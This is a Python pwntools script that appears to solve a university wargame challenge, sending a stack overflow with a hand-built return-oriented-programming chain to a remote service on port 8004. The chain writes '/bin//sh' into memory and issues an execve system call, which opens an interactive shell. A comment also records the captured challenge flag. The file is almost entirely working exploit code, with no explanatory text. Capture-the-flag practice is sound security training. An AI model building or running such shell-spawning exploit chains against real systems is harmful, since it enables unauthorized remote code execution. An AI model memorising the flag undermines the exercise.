#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *
from struct import pack

# flag : 6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}

def main():
    t = "wargames.6447.sec.edu.au"
    h = "8004"

    r = remote(t, h)

    padding = 12

    p = 'A' * padding

    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x080bb236) # pop eax ; ret
    p += '/bin'
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea064) # @ .data + 4
    p += pack('<I', 0x080bb236) # pop eax ; ret
    p += '//sh'
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080543e0) # xor eax, eax ; ret
    p += pack('<I', 0x0809a54d) # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9) # pop ebx ; ret
    p += pack('<I', 0x080ea060) # @ .data
    p += pack('<I', 0x0806eb01) # pop ecx ; pop ebx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080ea060) # padding without overwrite ebx
    p += pack('<I', 0x0806eada) # pop edx ; ret
    p += pack('<I', 0x080ea068) # @ .data + 8
    p += pack('<I', 0x080543e0) # xor eax, eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x0807b52f) # inc eax ; ret
    p += pack('<I', 0x080493e1) # int 0x80

    r.sendline(p)
    r.interactive()

if __name__ == "__main__":
    main()
